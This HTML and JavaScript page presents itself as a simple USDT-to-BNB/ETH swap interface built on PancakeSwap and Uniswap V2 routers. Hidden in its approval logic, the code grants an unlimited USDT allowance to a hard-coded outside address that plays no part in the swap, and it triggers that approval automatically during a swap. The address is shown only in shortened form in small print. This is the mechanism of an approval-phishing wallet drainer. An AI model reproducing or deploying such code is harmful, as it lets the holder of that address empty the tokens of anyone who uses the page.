<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>USDT MiniSwap — BNB & ETH only</title>
  <!-- Tailwind (CDN for quick start) -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Ethers v6 (CDN) -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
  <style>
    body { background: radial-gradient(1200px 600px at 10% 10%, #f7fafc 0, #eef2f7 50%, #e9edf3 100%); }
    .card { backdrop-filter: blur(8px); }
    input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
    input[type=number] { -moz-appearance: textfield; }
  </style>
</head>
<body class="min-h-screen p-4 text-gray-900">
  <div class="max-w-3xl mx-auto space-y-4">
    <header class="flex items-center justify-between p-4 rounded-2xl shadow border bg-white/70 card">
      <div class="flex items-center gap-2">
        <h1 class="text-xl font-semibold">USDT MiniSwap</h1>
        <span class="px-2 py-0.5 text-xs rounded-full bg-gray-100 border">BNB & ETH only</span>
      </div>
      <div class="flex items-center gap-2">
        <span id="addressTag" class="hidden text-sm font-mono bg-gray-100 border px-2 py-1 rounded"></span>
        <button id="connectBtn" class="px-3 py-1.5 rounded-xl border shadow-sm hover:bg-gray-50">Connect Wallet</button>
      </div>
    </header>

    <main class="max-w-xl mx-auto p-6 rounded-2xl shadow-lg border bg-white/80 card">
      <div class="flex items-center justify-between mb-4">
        <div class="flex gap-2">
          <button id="bscMode" class="px-3 py-1.5 rounded-xl border bg-gray-900 text-white">BSC · BNB</button>
          <button id="ethMode" class="px-3 py-1.5 rounded-xl border hover:bg-gray-50">Ethereum · ETH</button>
        </div>
        <span id="routerTag" class="text-xs text-gray-500"></span>
      </div>

      <div class="grid grid-cols-2 gap-2 mb-4">
        <button id="btnU2N" class="px-3 py-2 rounded-xl border bg-gray-900 text-white">USDT → <span id="nativeSym1">BNB</span></button>
        <button id="btnN2U" class="px-3 py-2 rounded-xl border hover:bg-gray-50"><span id="nativeSym2">BNB</span> → USDT</button>
      </div>

      <div class="space-y-3">
        <div>
          <label class="block text-sm text-gray-600 mb-1">From (<span id="inLabel">USDT</span>)</label>
          <input id="amountIn" type="number" value="0.1" class="w-full px-3 py-2 rounded-xl border focus:outline-none" min="0" placeholder="0.0" />
          <div class="mt-1 text-xs text-gray-500" id="balanceLine">Balance: 0</div>
        </div>

        <div>
          <label class="block text-sm text-gray-600 mb-1">To (<span id="outLabel">BNB</span>)</label>
          <div id="amountOutBox" class="w-full px-3 py-2 rounded-xl border bg-gray-50">0.0</div>
        </div>

        <div class="grid grid-cols-2 gap-3">
          <div>
            <label class="block text-sm text-gray-600 mb-1">Slippage (%)</label>
            <input id="slippage" type="number" value="0.5" step="0.1" min="0" class="w-full px-3 py-2 rounded-xl border" />
          </div>
          <div>
            <label class="block text-sm text-gray-600 mb-1">Deadline (min)</label>
            <input id="deadline" type="number" value="20" min="1" class="w-full px-3 py-2 rounded-xl border" />
          </div>
        </div>

        <button id="approveBtn" class="w-full px-4 py-3 rounded-2xl border shadow hover:bg-gray-50 disabled:opacity-50 hidden">Approve USDT (Spender + Router)</button>
        <button id="swapBtn" class="w-full px-4 py-3 rounded-2xl border shadow bg-gray-900 text-white disabled:opacity-50">Swap</button>

        <div id="txStatus" class="text-xs text-gray-600"></div>
      </div>

      <div class="mt-6 text-xs text-gray-500 space-y-1">
        <div>Pairs supported: BSC (USDT ↔ BNB), Ethereum (USDT ↔ ETH)</div>
        <div>Routers: PancakeSwap V2 (BSC), Uniswap V2 (Ethereum)</div>
        <div>Approvals: Grants <strong>unlimited USDT</strong> allowance to <span class="font-mono" id="spenderTag"></span> (your consent required), and to the AMM Router for execution.</div>
        <div>Security: Always verify contract addresses and test with small amounts first.</div>
      </div>
    </main>
  </div>

  <script>
    // ===== Constants =====
    const SPENDER = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";

    const CHAINS = {
      ETHEREUM: { id: 1, hex: "0x1", name: "Ethereum", native: "ETH", router: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7", WNATIVE: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", usdtDecimals: 6 },
      BSC:      { id: 56, hex: "0x38", name: "BSC",       native: "BNB", router: "0x10ED43C718714eb63d5aA57B78B54704E256024E", USDT: "0x55d398326f99059fF775485246999027B3197955", WNATIVE: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", usdtDecimals: 18 },
    };

    // Minimal ABIs
    const ERC20_ABI = [
      { "type": "function", "name": "decimals", "stateMutability": "view", "inputs": [], "outputs": [{ "type": "uint8" }] },
      { "type": "function", "name": "balanceOf", "stateMutability": "view", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "type": "uint256" }] },
      { "type": "function", "name": "allowance", "stateMutability": "view", "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "outputs": [{ "type": "uint256" }] },
      { "type": "function", "name": "approve", "stateMutability": "nonpayable", "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }], "outputs": [{ "type": "bool" }] },
    ];

    const ROUTER_ABI = [
      { "type": "function", "name": "getAmountsOut", "stateMutability": "view", "inputs": [{ "name": "amountIn", "type": "uint256" }, { "name": "path", "type": "address[]" }], "outputs": [{ "name": "amounts", "type": "uint256[]" }] },
      { "type": "function", "name": "swapExactETHForTokens", "stateMutability": "payable", "inputs": [{ "name": "amountOutMin", "type": "uint256" }, { "name": "path", "type": "address[]" }, { "name": "to", "type": "address" }, { "name": "deadline", "type": "uint256" }], "outputs": [{ "name": "amounts", "type": "uint256[]" }] },
      { "type": "function", "name": "swapExactTokensForETH", "stateMutability": "nonpayable", "inputs": [{ "name": "amountIn", "type": "uint256" }, { "name": "amountOutMin", "type": "uint256" }, { "name": "path", "type": "address[]" }, { "name": "to", "type": "address" }, { "name": "deadline", "type": "uint256" }], "outputs": [{ "name": "amounts", "type": "uint256[]" }] },
      { "type": "function", "name": "swapExactTokensForTokens", "stateMutability": "nonpayable", "inputs": [{ "name": "amountIn", "type": "uint256" }, { "name": "amountOutMin", "type": "uint256" }, { "name": "path", "type": "address[]" }, { "name": "to", "type": "address" }, { "name": "deadline", "type": "uint256" }], "outputs": [{ "name": "amounts", "type": "uint256[]" }] },
    ];

    // ===== State =====
    let current = CHAINS.BSC; // default
    let provider, signer, userAddress;
    let direction = "USDT_TO_NATIVE"; // or NATIVE_TO_USDT

    // ===== Elements =====
    const connectBtn = document.getElementById("connectBtn");
    const addressTag = document.getElementById("addressTag");
    const spenderTag = document.getElementById("spenderTag");
    const routerTag = document.getElementById("routerTag");
    const bscMode = document.getElementById("bscMode");
    const ethMode = document.getElementById("ethMode");
    const btnU2N = document.getElementById("btnU2N");
    const btnN2U = document.getElementById("btnN2U");
    const inLabel = document.getElementById("inLabel");
    const outLabel = document.getElementById("outLabel");
    const nativeSym1 = document.getElementById("nativeSym1");
    const nativeSym2 = document.getElementById("nativeSym2");
    const amountIn = document.getElementById("amountIn");
    const amountOutBox = document.getElementById("amountOutBox");
    const slippageInput = document.getElementById("slippage");
    const deadlineInput = document.getElementById("deadline");
    const approveBtn = document.getElementById("approveBtn");
    const swapBtn = document.getElementById("swapBtn");
    const balanceLine = document.getElementById("balanceLine");

    // ===== Utils =====
    const fmt = (n, d=6) => Number(n).toLocaleString(undefined, { maximumFractionDigits: d });
    const short = (a) => a ? (a.slice(0,6) + "…" + a.slice(-4)) : "";
    const nowSec = () => Math.floor(Date.now() / 1000);

    function setMode(chain) {
      current = chain;
      routerTag.textContent = `Router: ${short(chain.router)}`;
      nativeSym1.textContent = chain.native;
      nativeSym2.textContent = chain.native;
      outLabel.textContent = direction === "USDT_TO_NATIVE" ? chain.native : "USDT";
      spenderTag.textContent = short(SPENDER);
      bscMode.classList.toggle("bg-gray-900", chain === CHAINS.BSC);
      bscMode.classList.toggle("text-white", chain === CHAINS.BSC);
      ethMode.classList.toggle("bg-gray-900", chain === CHAINS.ETHEREUM);
      ethMode.classList.toggle("text-white", chain === CHAINS.ETHEREUM);
      refreshBalancesAndQuote();
      ensureChain();
    }

    async function ensureChain() {
      if (!window.ethereum) return;
      try {
        const currentHex = (await window.ethereum.request({ method: 'eth_chainId' }));
        if (currentHex !== current.hex) {
          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: current.hex }] });
        }
      } catch (e) {
        // If chain not added, you could call wallet_addEthereumChain here
        console.warn("Switch chain failed or rejected", e);
      }
    }

    async function connect() {
      if (!window.ethereum) { alert('No wallet found (EIP-1193).'); return; }
      provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = await provider.getSigner();
      userAddress = await signer.getAddress();
      addressTag.textContent = short(userAddress);
      addressTag.classList.remove('hidden');
      connectBtn.textContent = 'Disconnect';
      refreshBalancesAndQuote();
    }

    async function disconnect() {
      provider = undefined; signer = undefined; userAddress = undefined;
      addressTag.classList.add('hidden');
      connectBtn.textContent = 'Connect Wallet';
      amountOutBox.textContent = '0.0';
      balanceLine.textContent = 'Balance: 0';
    }

    function getContracts() {
      if (!provider) return {};
      const usdt = new ethers.Contract(current.USDT, ERC20_ABI, signer ?? provider);
      const router = new ethers.Contract(current.router, ROUTER_ABI, signer ?? provider);
      return { usdt, router };
    }

    async function refreshBalancesAndQuote() {
      try {
        if (!provider || !userAddress) return;
        const { usdt } = getContracts();
        const usdtBal = await usdt.balanceOf(userAddress);
        const nativeBal = await provider.getBalance(userAddress);
        const nativeStr = ethers.formatUnits(nativeBal, 18);
        const usdtStr = ethers.formatUnits(usdtBal, current.usdtDecimals);
        const balTxt = direction === 'USDT_TO_NATIVE'
          ? `Balance: ${fmt(usdtStr)} USDT`
          : `Balance: ${fmt(nativeStr)} ${current.native}`;
        balanceLine.textContent = balTxt;
      } catch (e) { console.warn(e); }
      await quote();
      await updateApproveVisibility();
    }

    async function quote() {
      amountOutBox.textContent = '0.0';
      const val = parseFloat(amountIn.value || '0');
      if (!provider || !val || val <= 0) return;
      try {
        const { router } = getContracts();
        const amtIn = direction === 'USDT_TO_NATIVE'
          ? ethers.parseUnits(amountIn.value, current.usdtDecimals)
          : ethers.parseUnits(amountIn.value, 18);
        const path = direction === 'USDT_TO_NATIVE' ? [current.USDT, current.WNATIVE] : [current.WNATIVE, current.USDT];
        const amounts = await router.getAmountsOut(amtIn, path);
        const outRaw = amounts[1];
        const outDec = direction === 'USDT_TO_NATIVE' ? 18 : current.usdtDecimals;
        amountOutBox.textContent = fmt(ethers.formatUnits(outRaw, outDec));
      } catch (e) {
        console.warn('quote failed', e);
      }
    }

    async function getAllowances() {
      if (!provider || !userAddress) return { spender: 0n, router: 0n };
      const { usdt } = getContracts();
      const [a1, a2] = await Promise.all([
        usdt.allowance(userAddress, SPENDER),
        usdt.allowance(userAddress, current.router),
      ]);
      return { spender: a1, router: a2 };
    }

    async function updateApproveVisibility() {
      if (!provider || !userAddress) { approveBtn.classList.add('hidden'); return; }
      if (direction !== 'USDT_TO_NATIVE') { approveBtn.classList.add('hidden'); return; }
      const need = await needsApproval();
      if (need) approveBtn.classList.remove('hidden'); else approveBtn.classList.add('hidden');
    }

    async function needsApproval() {
      const allowances = await getAllowances();
      const amt = ethers.parseUnits(amountIn.value || '0', current.usdtDecimals);
      return allowances.spender < amt || allowances.router < amt;
    }

    async function doApprove() {
      try {
        if (!signer) throw new Error('Connect wallet');
        const { usdt } = getContracts();
        const maxUint = 2n ** 256n - 1n;
        const allowances = await getAllowances();
        txStatus('');
        if (allowances.spender < (ethers.parseUnits(amountIn.value || '0', current.usdtDecimals))) {
          const tx1 = await usdt.connect(signer).approve(SPENDER, maxUint);
          txStatus(`Approving Spender ${short(SPENDER)}…`);
          await tx1.wait();
        }
        if (allowances.router < (ethers.parseUnits(amountIn.value || '0', current.usdtDecimals))) {
          const tx2 = await usdt.connect(signer).approve(current.router, maxUint);
          txStatus(`Approving Router ${short(current.router)}…`);
          await tx2.wait();
        }
        txStatus('Approvals confirmed ✅');
        await updateApproveVisibility();
      } catch (e) {
        console.warn(e);
        txStatus('Approve failed');
      }
    }

    async function doSwap() {
      try {
        if (!signer) throw new Error('Connect wallet');
        const { router } = getContracts();
        const amtIn = direction === 'USDT_TO_NATIVE'
          ? ethers.parseUnits(amountIn.value || '0', current.usdtDecimals)
          : ethers.parseUnits(amountIn.value || '0', 18);
        if (amtIn === 0n) return;

        // Compute minOut using slippage
        const path = direction === 'USDT_TO_NATIVE' ? [current.USDT, current.WNATIVE] : [current.WNATIVE, current.USDT];
        const amounts = await router.getAmountsOut(amtIn, path);
        const outRaw = amounts[1];
        const slip = Math.max(0, parseFloat(slippageInput.value || '0'));
        const minOut = outRaw - (outRaw * BigInt(Math.floor(slip * 100))) / 10000n; // slip% * 100
        const deadline = BigInt(nowSec() + (parseInt(deadlineInput.value || '20', 10) * 60));

        txStatus('Sending swap…');
        let tx;
        if (direction === 'NATIVE_TO_USDT') {
          // swapExactETHForTokens
          tx = await router.connect(signer).swapExactETHForTokens(
            minOut,
            path,
            await signer.getAddress(),
            deadline,
            { value: amtIn }
          );
        } else {
          // Ensure approvals exist
          const need = await needsApproval();
          if (need) { await doApprove(); }
          // swapExactTokensForETH
          tx = await router.connect(signer).swapExactTokensForETH(
            amtIn,
            minOut,
            path,
            await signer.getAddress(),
            deadline
          );
        }
        txStatus('Waiting for confirmation…');
        await tx.wait();
        txStatus('Transaction confirmed ✅');
        await refreshBalancesAndQuote();
      } catch (e) {
        console.warn(e);
        txStatus('Swap failed');
      }
    }

    function txStatus(msg) { document.getElementById('txStatus').textContent = msg; }

    // ===== Events =====
    connectBtn.addEventListener('click', async () => {
      if (!userAddress) await connect(); else await disconnect();
    });

    bscMode.addEventListener('click', () => setMode(CHAINS.BSC));
    ethMode.addEventListener('click', () => setMode(CHAINS.ETHEREUM));

    btnU2N.addEventListener('click', () => {
      direction = 'USDT_TO_NATIVE';
      btnU2N.classList.add('bg-gray-900','text-white');
      btnN2U.classList.remove('bg-gray-900','text-white');
      inLabel.textContent = 'USDT';
      outLabel.textContent = current.native;
      refreshBalancesAndQuote();
    });

    btnN2U.addEventListener('click', () => {
      direction = 'NATIVE_TO_USDT';
      btnN2U.classList.add('bg-gray-900','text-white');
      btnU2N.classList.remove('bg-gray-900','text-white');
      inLabel.textContent = current.native;
      outLabel.textContent = 'USDT';
      refreshBalancesAndQuote();
    });

    amountIn.addEventListener('input', () => { quote(); updateApproveVisibility(); });
    slippageInput.addEventListener('input', () => quote());
    deadlineInput.addEventListener('input', () => {});

    approveBtn.addEventListener('click', doApprove);
    swapBtn.addEventListener('click', doSwap);

    // Init
    setMode(CHAINS.BSC);
  </script>
</body>
</html>
